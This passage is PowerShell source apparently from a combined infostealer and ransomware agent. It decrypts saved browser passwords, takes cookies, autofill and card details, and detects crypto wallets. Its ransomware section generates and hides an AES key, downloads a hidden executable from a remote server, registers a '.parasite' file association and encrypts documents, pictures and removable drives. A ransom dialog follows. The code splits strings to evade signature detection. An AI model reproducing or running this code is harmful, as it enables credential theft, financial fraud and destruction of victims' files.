            if (-not (Test-Path $dbPath)) {
                continue
            }
            
            Write-Log "Found $browserName database: $dbPath"
            
            # Get master key for Chrome-based browsers
            $masterKey = $null
            $basePath = Split-Path (Split-Path $dbPath)
            $localStatePath = "$basePath\Local State"
            if (Test-Path $localStatePath) {
                $masterKey = Get-ChromeMasterKey -LocalStatePath $localStatePath
            }
            
            # Build table name dynamically to avoid static signatures
                            $loginTable = vxczc @('lo','gin','s')
            $query = "SELECT origin_url, username_value, password_value FROM $loginTable"
            $results = Query-SQLite -DatabasePath $dbPath -Query $query
            
            foreach ($result in $results) {
                if ($result.password_value -and $result.password_value.GetType().Name -eq "Byte[]") {
                    $decryptedPassword = Decrypt-ChromePassword -EncryptedPassword $result.password_value -MasterKey $masterKey
                    
                    if ($decryptedPassword) {
                        $passwords += @{
                            Browser = $browserName
                            Profile = Split-Path (Split-Path $dbPath) -Leaf
                            URL = $result.origin_url
                            Username = $result.username_value
                            Password = $decryptedPassword
                        }
                    }
                }
            }
        }
    }
    
    # Check for portable browser installations (matching Go agent)
    $portablePaths = @(
        "$env:USERPROFILE\Desktop",
        "$env:USERPROFILE\Downloads",
        "C:\PortableApps",
        "D:\PortableApps",
        "E:\PortableApps"
    )
    
    foreach ($basePath in $portablePaths) {
        if (-not (Test-Path $basePath)) {
            continue
        }
        
        $portablePatterns = @(
            "$basePath\*Chrome*\User Data\Default\Login Data",
            "$basePath\*Chromium*\User Data\Default\Login Data", 
            "$basePath\*Thorium*\User Data\Default\Login Data",
            "$basePath\*Browser*\User Data\Default\Login Data",
            "$basePath\*Opera*\Login Data",
            "$basePath\*Brave*\User Data\Default\Login Data"
        )
        
        foreach ($pattern in $portablePatterns) {
            $matches = Get-ChildItem -Path $pattern -ErrorAction SilentlyContinue
            foreach ($match in $matches) {
                Write-Log "Found portable browser: $($match.FullName)"
                
                # Build table name dynamically to avoid static signatures
                $loginTable = vxczc @('lo','gin','s')
                $query = "SELECT origin_url, username_value, password_value FROM $loginTable"
                $results = Query-SQLite -DatabasePath $match.FullName -Query $query
                
                foreach ($result in $results) {
                    if ($result.password_value -and $result.password_value.GetType().Name -eq "Byte[]") {
                        $decryptedPassword = Decrypt-ChromePassword -EncryptedPassword $result.password_value -MasterKey $null
                        
                        if ($decryptedPassword) {
                            $passwords += @{
                                Browser = "Portable Browser"
                                Profile = "Default"
                                URL = $result.origin_url
                                Username = $result.username_value
                                Password = $decryptedPassword
                            }
                        }
                    }
                }
            }
        }
    }
    
    # Firefox-based browsers (matching Go agent exactly)
    $firefoxBrowsers = @{
        "Firefox" = "$env:APPDATA\Mozilla\Firefox\Profiles"
        "Firefox ESR" = "$env:APPDATA\Mozilla\Firefox ESR\Profiles"
        "Firefox Dev" = "$env:APPDATA\Mozilla\Firefox Developer Edition\Profiles"
        "Firefox Nightly" = "$env:APPDATA\Mozilla\Firefox Nightly\Profiles"
        "Floorp" = "$env:APPDATA\Floorp\Profiles"
        "Waterfox" = "$env:APPDATA\Waterfox\Profiles"
        "Pale Moon" = "$env:APPDATA\Moonchild Productions\Pale Moon\Profiles"
        "Basilisk" = "$env:APPDATA\Moonchild Productions\Basilisk\Profiles"
        "LibreWolf" = "$env:APPDATA\LibreWolf\Profiles"
        "SeaMonkey" = "$env:APPDATA\Mozilla\SeaMonkey\Profiles"
        "IceCat" = "$env:APPDATA\Mozilla\IceCat\Profiles"
        "K-Meleon" = "$env:APPDATA\K-Meleon\Profiles"
        "Cyberfox" = "$env:APPDATA\8pecxstudios\Cyberfox\Profiles"
    }
    
    foreach ($browserName in $firefoxBrowsers.Keys) {
        $basePath = $firefoxBrowsers[$browserName]
        
        if (-not (Test-Path $basePath)) {
            continue
        }
        
        $profiles = Get-ChildItem $basePath -Directory -ErrorAction SilentlyContinue
        foreach ($profile in $profiles) {
            $loginsPath = "$($profile.FullName)\logins.json"
            if (Test-Path $loginsPath) {
                try {
                    $logins = Get-Content $loginsPath | ConvertFrom-Json
                    foreach ($login in $logins.logins) {
                        $passwords += @{
                            Browser = $browserName
                            Profile = $profile.Name
                            URL = $login.hostname
                            Username = $login.encryptedUsername
                            Password = "**Encrypted**"
                        }
                    }
                } catch {}
            }
        }
    }
    
    Write-Log "Extracted $($passwords.Count) browser passwords"
    return $passwords
}

function Get-BrowserCookies {
    Write-Log "Extracting browser cookies..."
    
    $cookies = @()
    
    # Comprehensive Chromium-based browser cookie paths (matching Go agent exactly)
    $chromiumCookiePaths = @{
        "Chrome" = @(
            "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies",
            "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 1\Network\Cookies",
            "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 2\Network\Cookies",
            "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 3\Network\Cookies"
        )
        "Edge" = @(
            "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies",
            "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Profile 1\Network\Cookies",
            "$env:LOCALAPPDATA\Microsoft\Edge Dev\User Data\Default\Network\Cookies",
            "$env:LOCALAPPDATA\Microsoft\Edge Beta\User Data\Default\Network\Cookies",
            "$env:LOCALAPPDATA\Microsoft\Edge Canary\User Data\Default\Network\Cookies"
        )
        "Brave" = @(
            "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies",
            "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Profile 1\Network\Cookies",
            "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser-Beta\User Data\Default\Network\Cookies",
            "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser-Dev\User Data\Default\Network\Cookies"
        )
        "Thorium" = @(
            "$env:LOCALAPPDATA\Thorium\User Data\Default\Network\Cookies",
            "$env:LOCALAPPDATA\Thorium\User Data\Profile 1\Network\Cookies"
        )
        "Opera" = @(
            "$env:APPDATA\Opera Software\Opera Stable\Network\Cookies",
            "$env:APPDATA\Opera Software\Opera Beta\Network\Cookies",
            "$env:APPDATA\Opera Software\Opera Developer\Network\Cookies"
        )
        "Opera GX" = @(
            "$env:APPDATA\Opera Software\Opera GX Stable\Network\Cookies",
            "$env:APPDATA\Opera Software\Opera GX Beta\Network\Cookies"
        )
        "Vivaldi" = @(
            "$env:LOCALAPPDATA\Vivaldi\User Data\Default\Network\Cookies",
            "$env:LOCALAPPDATA\Vivaldi\User Data\Profile 1\Network\Cookies"
        )
        "Yandex" = @(
            "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data\Default\Network\Cookies",
            "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data\Profile 1\Network\Cookies"
        )
        "UC Browser" = @(
            "$env:LOCALAPPDATA\UCBrowser\User Data\Default\Network\Cookies"
        )
        "Chromium" = @(
            "$env:LOCALAPPDATA\Chromium\User Data\Default\Network\Cookies",
            "$env:LOCALAPPDATA\Chromium\User Data\Profile 1\Network\Cookies"
        )
        "Cent Browser" = @(
            "$env:LOCALAPPDATA\CentBrowser\User Data\Default\Network\Cookies"
        )
        "SRWare Iron" = @(
            "$env:LOCALAPPDATA\Chromium\User Data\Default\Network\Cookies",
            "C:\Program Files\SRWare Iron\User Data\Default\Network\Cookies",
            "C:\Program Files (x86)\SRWare Iron\User Data\Default\Network\Cookies"
        )
        "Comodo Dragon" = @(
            "$env:LOCALAPPDATA\Comodo\Dragon\User Data\Default\Network\Cookies"
        )
        "Torch Browser" = @(
            "$env:LOCALAPPDATA\Torch\User Data\Default\Network\Cookies"
        )
        "Maxthon" = @(
            "$env:LOCALAPPDATA\Maxthon3\User Data\Default\Network\Cookies",
            "$env:LOCALAPPDATA\Maxthon5\User Data\Default\Network\Cookies"
        )
        "Slimjet" = @(
            "$env:LOCALAPPDATA\Slimjet\User Data\Default\Network\Cookies"
        )
        "CocCoc" = @(
            "$env:LOCALAPPDATA\CocCoc\Browser\User Data\Default\Network\Cookies"
        )
        "Avast Secure Browser" = @(
            "$env:LOCALAPPDATA\AVAST Software\Browser\User Data\Default\Network\Cookies"
        )
        "AVG Secure Browser" = @(
            "$env:LOCALAPPDATA\AVG\Browser\User Data\Default\Network\Cookies"
        )
        "360 Chrome" = @(
            "$env:LOCALAPPDATA\360Chrome\Chrome\User Data\Default\Network\Cookies"
        )
        "QQBrowser" = @(
            "$env:LOCALAPPDATA\Tencent\QQBrowser\User Data\Default\Network\Cookies"
        )
        "Sogou Explorer" = @(
            "$env:LOCALAPPDATA\Sogou\SogouExplorer\User Data\Default\Network\Cookies"
        )
    }
    
    foreach ($browserName in $chromiumCookiePaths.Keys) {
        $paths = $chromiumCookiePaths[$browserName]
        
        foreach ($cookiePath in $paths) {
            if (-not (Test-Path $cookiePath)) {
                continue
            }
            
            Write-Log "Found $browserName cookies: $cookiePath"
            
                            $cookieTable = vxczc @('co','ok','ies')
            $query = "SELECT host_key, name, value, encrypted_value, expires_utc FROM $cookieTable LIMIT 50"
            $results = Query-SQLite -DatabasePath $cookiePath -Query $query
            
            foreach ($result in $results) {
                $cookieValue = $result.value
                
                # Try to decrypt encrypted cookies
                if ($result.encrypted_value -and $result.encrypted_value.GetType().Name -eq "Byte[]") {
                    $decrypted = Decrypt-DPAPIBlob -EncryptedData $result.encrypted_value
                    if ($decrypted) {
                        $cookieValue = $decrypted
                    }
                }
                
                $cookies += @{
                    Browser = $browserName
                    Domain = $result.host_key
                    Name = $result.name
                    Value = $cookieValue
                    Expires = $result.expires_utc
                }
            }
        }
    }
    
    # Check portable browser installations
    $portablePaths = @(
        "$env:USERPROFILE\Downloads",
        "$env:USERPROFILE\Desktop",
        "C:\PortableApps"
    )
    
    foreach ($basePath in $portablePaths) {
        if (-not (Test-Path $basePath)) {
            continue
        }
        
        $portablePattern = "$basePath\*Chrome*\User Data\Default\Network\Cookies"
        $matches = Get-ChildItem -Path $portablePattern -ErrorAction SilentlyContinue
        foreach ($match in $matches) {
            $query = "SELECT host_key, name, value, encrypted_value, expires_utc FROM cookies LIMIT 50"
            $results = Query-SQLite -DatabasePath $match.FullName -Query $query
            
            foreach ($result in $results) {
                $cookieValue = $result.value
                
                if ($result.encrypted_value -and $result.encrypted_value.GetType().Name -eq "Byte[]") {
                    $decrypted = Decrypt-DPAPIBlob -EncryptedData $result.encrypted_value
                    if ($decrypted) {
                        $cookieValue = $decrypted
                    }
                }
                
                $cookies += @{
                    Browser = "Portable Chrome"
                    Domain = $result.host_key
                    Name = $result.name
                    Value = $cookieValue
                    Expires = $result.expires_utc
                }
            }
        }
    }
    
    # Firefox-based browsers (matching Go agent exactly)
    $firefoxBasePaths = @{
        "Firefox" = "$env:APPDATA\Mozilla\Firefox\Profiles"
        "Firefox ESR" = "$env:APPDATA\Mozilla\Firefox ESR\Profiles"
        "Firefox Dev" = "$env:APPDATA\Mozilla\Firefox Developer Edition\Profiles"
        "Firefox Nightly" = "$env:APPDATA\Mozilla\Firefox Nightly\Profiles"
        "Waterfox" = "$env:APPDATA\Waterfox\Profiles"
        "Pale Moon" = "$env:APPDATA\Moonchild Productions\Pale Moon\Profiles"
        "Basilisk" = "$env:APPDATA\Moonchild Productions\Basilisk\Profiles"
        "LibreWolf" = "$env:APPDATA\LibreWolf\Profiles"
        "SeaMonkey" = "$env:APPDATA\Mozilla\SeaMonkey\Profiles"
        "IceCat" = "$env:APPDATA\Mozilla\IceCat\Profiles"
        "K-Meleon" = "$env:APPDATA\K-Meleon\Profiles"
        "Cyberfox" = "$env:APPDATA\8pecxstudios\Cyberfox\Profiles"
        "Floorp" = "$env:APPDATA\Floorp\Profiles"
    }
    
    foreach ($browserName in $firefoxBasePaths.Keys) {
        $basePath = $firefoxBasePaths[$browserName]
        
        if (-not (Test-Path $basePath)) {
            continue
        }
        
        $profiles = Get-ChildItem $basePath -Directory -ErrorAction SilentlyContinue
        foreach ($profile in $profiles) {
            $cookiesPath = "$($profile.FullName)\cookies.sqlite"
            if (Test-Path $cookiesPath) {
                Write-Log "Found $browserName cookies: $cookiesPath"
                
                $cookieTable = vxczc @('co','ok','ies')
                $query = "SELECT host, name, value, expiry FROM moz_cookies LIMIT 50"
                $results = Query-SQLite -DatabasePath $cookiesPath -Query $query
                
                foreach ($result in $results) {
                    $cookies += @{
                        Browser = $browserName
                        Domain = $result.host
                        Name = $result.name
                        Value = $result.value
                        Expires = $result.expiry
                    }
                }
            }
        }
    }
    
    Write-Log "Extracted $($cookies.Count) browser cookies"
    return $cookies
}

function Get-BrowserAutofill {
    Write-Log "Extracting browser autofill data..."
    
    $autofill = @()
    
    # Comprehensive Chromium-based browser autofill paths (matching Go agent exactly)
    $chromiumAutofillPaths = @{
        "Chrome" = @(
            "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Web Data",
            "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 1\Web Data"
        )
        "Edge" = @(
            "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Web Data",
            "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Profile 1\Web Data",
            "$env:LOCALAPPDATA\Microsoft\Edge Dev\User Data\Default\Web Data"
        )
        "Brave" = @(
            "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Web Data"
        )
        "Thorium" = @(
            "$env:LOCALAPPDATA\Thorium\User Data\Default\Web Data",
            "$env:LOCALAPPDATA\Thorium\User Data\Profile 1\Web Data"
        )
        "Opera" = @(
            "$env:APPDATA\Opera Software\Opera Stable\Web Data"
        )
        "Opera GX" = @(
            "$env:APPDATA\Opera Software\Opera GX Stable\Web Data"
        )
        "Vivaldi" = @(
            "$env:LOCALAPPDATA\Vivaldi\User Data\Default\Web Data"
        )
        "Yandex" = @(
            "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data\Default\Web Data"
        )
        "Chromium" = @(
            "$env:LOCALAPPDATA\Chromium\User Data\Default\Web Data"
        )
        "Avast Secure Browser" = @(
            "$env:LOCALAPPDATA\AVAST Software\Browser\User Data\Default\Web Data"
        )
        "AVG Secure Browser" = @(
            "$env:LOCALAPPDATA\AVG\Browser\User Data\Default\Web Data"
        )
    }
    
    foreach ($browserName in $chromiumAutofillPaths.Keys) {
        $paths = $chromiumAutofillPaths[$browserName]
        
        foreach ($webDataPath in $paths) {
            if (-not (Test-Path $webDataPath)) {
                continue
            }
            
            Write-Log "Found $browserName autofill: $webDataPath"
            
                            $autofillTable = vxczc @('au','to','fill')
            $query = "SELECT name, value, count FROM $autofillTable ORDER BY count DESC LIMIT 50"
            $results = Query-SQLite -DatabasePath $webDataPath -Query $query
            
            foreach ($result in $results) {
                $autofill += @{
                    Browser = $browserName
                    Type = "Autofill"
                    Name = $result.name
                    Value = $result.value
                    Count = $result.count
                }
            }
            
            # Get credit card data
            $query = "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"
            $results = Query-SQLite -DatabasePath $webDataPath -Query $query
            
            foreach ($result in $results) {
                $autofill += @{
                    Browser = $browserName
                    Type = "CreditCard"
                    NameOnCard = $result.name_on_card
                    ExpirationMonth = $result.expiration_month
                    ExpirationYear = $result.expiration_year
                    Number = if ($result.card_number_encrypted) { "**Encrypted**" } else { "**No Data**" }
                }
            }
            
            # Get masked credit card data
            $query = "SELECT name_on_card, network, last_four FROM masked_credit_cards"
            $results = Query-SQLite -DatabasePath $webDataPath -Query $query
            
            foreach ($result in $results) {
                $autofill += @{
                    Browser = $browserName
                    Type = "MaskedCreditCard"
                    NameOnCard = $result.name_on_card
                    Network = $result.network
                    LastFour = $result.last_four
                }
            }
        }
    }
    
    # Firefox autofill (matching Go agent)
    $firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $firefoxPath) {
        $profiles = Get-ChildItem $firefoxPath -Directory -ErrorAction SilentlyContinue
        foreach ($profile in $profiles) {
            $formhistoryPath = "$($profile.FullName)\formhistory.sqlite"
            if (Test-Path $formhistoryPath) {
                Write-Log "Found Firefox formhistory: $formhistoryPath"
                
                $autofillTable = vxczc @('fo','rm','his','tory')
                $query = "SELECT fieldname, value, timesUsed, firstUsed, lastUsed FROM moz_formhistory ORDER BY timesUsed DESC LIMIT 100"
                $results = Query-SQLite -DatabasePath $formhistoryPath -Query $query
                
                foreach ($result in $results) {
                    $autofill += @{
                        Browser = "Firefox"
                        Type = "FormHistory"
                        Name = $result.fieldname
                        Value = $result.value
                        Count = $result.timesUsed
                        FirstUsed = $result.firstUsed
                        LastUsed = $result.lastUsed
                    }
                }
            }
        }
    }
    
    Write-Log "Extracted $($autofill.Count) autofill entries"
    return $autofill
}

# =============================================
# WALLET DETECTION FUNCTIONS
# =============================================

function Get-DetectedWallets {
    Write-Log "Detecting cryptocurrency wallets..."
    
    $wallets = @{
        running_wallets = @()
        installed_wallets = @()
        browser_extensions = @()
    }
    
    # Desktop wallet processes with friendly names
    $walletProcessMap = @{
        "exodus" = "Exodus"
        "atomic" = "Atomic Wallet"
        "electrum" = "Electrum"
        "bitcoin-qt" = "Bitcoin Core"
        "litecoin-qt" = "Litecoin Core"
        "dogecoin-qt" = "Dogecoin Core"
        "monero-wallet-gui" = "Monero GUI"
        "zcash4win" = "Zcash"
        "dash-qt" = "Dash Core"
        "ethereum-wallet" = "Ethereum Wallet"
        "mist" = "Mist"
        "jaxx" = "Jaxx"
        "coinomi" = "Coinomi"
        "wasabi" = "Wasabi Wallet"
        "sparrow" = "Sparrow"
        "specter" = "Specter Desktop"
    }
    
    $runningProcesses = Get-Process | Select-Object ProcessName, Id
    foreach ($process in $runningProcesses) {
        $processNameLower = $process.ProcessName.ToLower()
        if ($walletProcessMap.ContainsKey($processNameLower)) {
            $wallets.running_wallets += @{
                process_name = $walletProcessMap[$processNameLower]
                process_id   = $process.Id
            }
        }
    }
    
    # Check for installed desktop wallets
    $walletPaths = @{
        "Exodus" = "$env:USERPROFILE\AppData\Roaming\Exodus"
        "Atomic Wallet" = "$env:USERPROFILE\AppData\Roaming\atomic"
        "Electrum" = "$env:USERPROFILE\AppData\Roaming\Electrum"
        "Bitcoin Core" = "$env:USERPROFILE\AppData\Roaming\Bitcoin"
        "Litecoin Core" = "$env:USERPROFILE\AppData\Roaming\Litecoin"
        "Monero GUI" = "$env:USERPROFILE\Documents\Monero"
        "Zcash" = "$env:USERPROFILE\AppData\Roaming\Zcash"
        "Dash Core" = "$env:USERPROFILE\AppData\Roaming\DashCore"
        "Ethereum Wallet" = "$env:USERPROFILE\AppData\Roaming\Ethereum Wallet"
        "Jaxx" = "$env:USERPROFILE\AppData\Roaming\com.liberty.jaxx"
        "Coinomi" = "$env:USERPROFILE\AppData\Local\Coinomi\Coinomi"
    }
    
    foreach ($walletName in $walletPaths.Keys) {
        $path = $walletPaths[$walletName]
        if (Test-Path $path) {
            $wallets.installed_wallets += @{
                wallet_name  = $walletName
                install_path = $path
            }
        }
    }
    
    # Check for browser extension wallets
    $extensionPaths = @{
        "Chrome" = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Extensions"
        "Edge" = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Extensions"
        "Brave" = "$env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Extensions"
    }
    
    $walletExtensions = @{
        "nkbihfbeogaeaoehlefnkodbefgpgknn" = "MetaMask"
        "ibnejdfjmmkpcnlpebklmnkoeoihofec" = "TronLink"
        "jbdaocneiiinmjbjlgalhcelgbejmnid" = "Nifty Wallet"
        "afbcbjpbpfadlkmhmclhkeeodmamcflc" = "Math Wallet"
        "hnfanknocfeofbddgcijnmhnfnkdnaad" = "Coinbase Wallet"
        "fhbohimaelbohpjbbldcngcnapndodjp" = "Binance Chain Wallet"
        "odbfpeeihdkbihmopkbjmoonfanlbfcl" = "Brave Wallet"
        "bfnaelmomeimhlpmgjnjophhpkkoljpa" = "Phantom"
        "egjidjbpglichdcondbcbdnbeeppgdph" = "Trust Wallet"
    }
    
    foreach ($browser in $extensionPaths.Keys) {
        $extensionPath = $extensionPaths[$browser]
        if (Test-Path $extensionPath) {
            $extensions = Get-ChildItem $extensionPath -Directory -ErrorAction SilentlyContinue
            foreach ($extension in $extensions) {
                if ($walletExtensions.ContainsKey($extension.Name)) {
                    # Check if extension is active by looking for manifest
                    $manifestPath = Join-Path $extension.FullName "manifest.json"
                    $isActive = Test-Path $manifestPath
                    
                    $wallets.browser_extensions += @{
                        browser        = $browser
                        extension_name = $walletExtensions[$extension.Name]
                        id             = $extension.Name
                        is_active      = $isActive
                        profile        = "Default"
                    }
                }
            }
        }
    }
    
    Write-Log "Detected wallets - Running: $($wallets.running_wallets.Count), Installed: $($wallets.installed_wallets.Count), Extensions: $($wallets.browser_extensions.Count)"
    return $wallets
}

# =============================================
# RANSOMWARE FUNCTIONALITY
# =============================================

# Global ransomware configuration
$script:EnableRansomware = $false
$script:SimulationMode = $false
$script:RansomwareKey = $null
$script:RansomwareIV = $null
$script:MachineID = "$env:COMPUTERNAME-$env:USERNAME"

function New-RansomwareKey {
    Write-Log "Generating ransomware encryption key..."
    
    try {
        # Generate 32-byte AES-256 key and 16-byte IV
        $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
        $keyBytes = New-Object byte[] 32
        $ivBytes = New-Object byte[] 16
        
        $rng.GetBytes($keyBytes)
        $rng.GetBytes($ivBytes)
        
        $script:RansomwareKey = [Convert]::ToBase64String($keyBytes)
        $script:RansomwareIV = [Convert]::ToBase64String($ivBytes)
        
        # Store key persistently
        Save-RansomwareKey
        
        Write-Log "Ransomware key generated successfully"
        return @{
            machine_id = $script:MachineID
            key = $script:RansomwareKey
            iv = $script:RansomwareIV
            timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss UTC'
        }
        
    } catch {
        Write-Log "Failed to generate ransomware key: $_" "ERROR"
        return $null
    }
}

function Save-RansomwareKey {
    try {
        # Store key in hidden file for persistence
        $keyFile = "$env:APPDATA\Microsoft\Windows\Themes\.cache"
        $keyData = @{
            machine_id = $script:MachineID
            key = $script:RansomwareKey
            iv = $script:RansomwareIV
            timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss UTC'
        }
        
        # Ensure directory exists
        $keyDir = Split-Path $keyFile -Parent
        if (-not (Test-Path $keyDir)) {
            New-Item -ItemType Directory -Path $keyDir -Force | Out-Null
        }
        
        # Save encrypted key data
        $keyData | ConvertTo-Json -Compress | Out-File $keyFile -Force -Encoding UTF8
        
        # Hide the file
        $fileItem = Get-Item $keyFile
        $fileItem.Attributes = $fileItem.Attributes -bor [System.IO.FileAttributes]::Hidden
        $fileItem.Attributes = $fileItem.Attributes -bor [System.IO.FileAttributes]::System
        
        Write-Log "Ransomware key saved persistently"
        
    } catch {
        Write-Log "Failed to save ransomware key: $_" "ERROR"
    }
}

function Load-RansomwareKey {
    try {
        $keyFile = "$env:APPDATA\Microsoft\Windows\Themes\.cache"
        
        if (Test-Path $keyFile) {
            $keyData = Get-Content $keyFile | ConvertFrom-Json
            
            $script:RansomwareKey = $keyData.key
            $script:RansomwareIV = $keyData.iv
            
            Write-Log "Ransomware key loaded from persistent storage"
            return $true
        }
        
        return $false
        
    } catch {
        Write-Log "Failed to load ransomware key: $_" "ERROR"
        return $false
    }
}

# Viewer deployment and file association functions
function Deploy-ParasiteViewer {
    try {
        $viewerUrl = "$xzvcv/parasite-viewer.exe"
        $viewerPath = "$env:APPDATA\Microsoft\Windows\Themes\parasite-viewer.exe"
        
        Write-Log "Deploying parasite viewer from $viewerUrl" "INFO"
        
        $webClient = New-Object System.Net.WebClient
                    $webClient.Headers.Add("User-Agent", $zxcvx)
        $webClient.DownloadFile($viewerUrl, $viewerPath)
        
        # Hide the viewer executable
        $file = Get-Item $viewerPath -Force
        $file.Attributes = $file.Attributes -bor [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
        
        Write-Log "Parasite viewer deployed to $viewerPath" "INFO"
        return $viewerPath
    }
    catch {
        Write-Log "Failed to deploy parasite viewer: $($_.Exception.Message)" "ERROR"
        return $null
    }
}

function Register-ParasiteFileAssociation {
    param([string]$ViewerPath)
    
    try {
        Write-Log "Registering .parasite file association" "INFO"
        
        # Register the file extension
        $regPath = "HKCU:\Software\Classes\.parasite"
        New-Item -Path $regPath -Force | Out-Null
        Set-ItemProperty -Path $regPath -Name "(Default)" -Value "ParasiteFile"
        
        # Register the file type
        $regPath = "HKCU:\Software\Classes\ParasiteFile"
        New-Item -Path $regPath -Force | Out-Null
        Set-ItemProperty -Path $regPath -Name "(Default)" -Value "Encrypted Parasite File"
        
        # Register the shell command
        $regPath = "HKCU:\Software\Classes\ParasiteFile\shell\open\command"
        New-Item -Path $regPath -Force | Out-Null
        Set-ItemProperty -Path $regPath -Name "(Default)" -Value "`"$ViewerPath`" `"%1`""
        
        Write-Log "File association registered successfully" "INFO"
        return $true
    }
    catch {
        Write-Log "Failed to register file association: $($_.Exception.Message)" "ERROR"
        return $false
    }
}

function Show-RansomwareCompletionDialog {
    param(
        [int]$FilesEncrypted,
        [string]$MachineId
    )
    
    try {
        $title = "PARASITE RANSOMWARE"
        $message = @"
ENCRYPTION COMPLETE!

$FilesEncrypted files have been encrypted and are now inaccessible.

Machine ID: $MachineId

All your files now have the .parasite extension.
Double-click any encrypted file to see recovery instructions.

This system has been compromised.
"@
        
        # Show system modal message box
        Add-Type -AssemblyName System.Windows.Forms
        [System.Windows.Forms.MessageBox]::Show($message, $title, [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
        
        Write-Log "Completion dialog displayed" "INFO"
    }
    catch {
        Write-Log "Failed to show completion dialog: $($_.Exception.Message)" "ERROR"
    }
}

function Get-TargetDirectories {
    $targetDirs = @()
    
    # User profile directories
    $userDirs = @(
        "$env:USERPROFILE\Documents",
        "$env:USERPROFILE\Pictures", 
        "$env:USERPROFILE\Desktop",
        "$env:USERPROFILE\Downloads",
        "$env:USERPROFILE\Music",
        "$env:USERPROFILE\Videos"
    )
    
    foreach ($dir in $userDirs) {
        if (Test-Path $dir) {
            $targetDirs += $dir
        }
    }
    
    # Check for removable drives
    try {
        $drives = Get-WmiObject -Class Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 }
        foreach ($drive in $drives) {
            if (Test-Path $drive.DeviceID) {
                $targetDirs += $drive.DeviceID
            }
        }
    } catch {}
    
    return $targetDirs
}

function Get-TargetExtensions {
    return @(
        '.doc', '.docx', '.docm', '.dot', '.dotx', '.dotm',
        '.xls', '.xlsx', '.xlsm', '.xlt', '.xltx', '.xltm',
        '.ppt', '.pptx', '.pptm', '.pot', '.potx', '.potm',
        '.pdf', '.rtf', '.odt', '.ods', '.odp',
        '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.svg',
        '.mp3', '.wav', '.flac', '.aac', '.m4a',
        '.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv',
        '.zip', '.rar', '.7z', '.tar', '.gz',
        '.txt', '.csv', '.json', '.xml', '.log',
        '.ps1', '.bat', '.cmd', '.vbs',
        '.sql', '.db', '.sqlite', '.mdb',
        '.psd', '.ai', '.sketch', '.fig'
    )
}

function Encrypt-File {
    param([string]$FilePath)
    
    try {
        $fileInfo = Get-Item $FilePath -ErrorAction Stop
        
        # Skip files larger than 100MB to avoid long processing times
        if ($fileInfo.Length -gt 100MB) {
            return @{ success = $false; error = "File too large" }
        }
        
        # Skip already encrypted files
        if ($fileInfo.Name.EndsWith('.parasite')) {
            return @{ success = $false; error = "Already encrypted" }
        }
        
        # Use single custom extension instead of double extension
        $encryptedPath = [System.IO.Path]::ChangeExtension($FilePath, "parasite")
        
        if ($script:SimulationMode) {
            # Simulation mode - just copy file
            Copy-Item $FilePath $encryptedPath -Force
            Write-Log "Simulated encryption: $($fileInfo.Name)"
            return @{ success = $true; encrypted_path = $encryptedPath }
        }
        
        # Real encryption mode with header corruption
        $keyBytes = [Convert]::FromBase64String($script:RansomwareKey)
        $ivBytes = [Convert]::FromBase64String($script:RansomwareIV)
        
        # Read original file with retry logic and shared access
        $originalBytes = $null
        $maxRetries = 5
        $baseDelay = 100  # milliseconds
        
        for ($attempt = 1; $attempt -le $maxRetries; $attempt++) {
            try {
                # Use FileStream with shared read/write/delete access
                $fileStream = New-Object System.IO.FileStream(
                    $FilePath,
                    [System.IO.FileMode]::Open,
                    [System.IO.FileAccess]::Read,
                    ([System.IO.FileShare]::ReadWrite -bor [System.IO.FileShare]::Delete)
                )
                
                $originalBytes = New-Object byte[] $fileStream.Length
                $fileStream.Read($originalBytes, 0, $originalBytes.Length) | Out-Null
                $fileStream.Close()
                $fileStream.Dispose()
                
                Write-Log "Successfully read file on attempt $attempt`: $($fileInfo.Name)"
                break
                
            } catch [System.IO.IOException] {
                if ($attempt -eq $maxRetries) {
                    Write-Log "Failed to read file after $maxRetries attempts: $($fileInfo.Name) - $($_.Exception.Message)" "ERROR"
                    return @{ success = $false; error = "File access failed after retries: $($_.Exception.Message)" }
                }
                
                # Exponential backoff: 100ms, 200ms, 400ms, 800ms, 1600ms
                $delay = $baseDelay * [Math]::Pow(2, $attempt - 1)
                Write-Log "File locked, retry $attempt/$maxRetries in ${delay}ms`: $($fileInfo.Name)" "WARN"
                Start-Sleep -Milliseconds $delay
            }
        }
        
        if (-not $originalBytes) {
            return @{ success = $false; error = "Failed to read file data" }
        }
        
        $headerSize = [Math]::Min(1024, $originalBytes.Length)
        $originalHeader = $originalBytes[0..($headerSize-1)]
        
        # Create magic header for corruption
        $magicHeader = [System.Text.Encoding]::UTF8.GetBytes("PARASITE_ENCRYPTED_FILE_v1.0")
        $paddedMagic = New-Object byte[] $headerSize
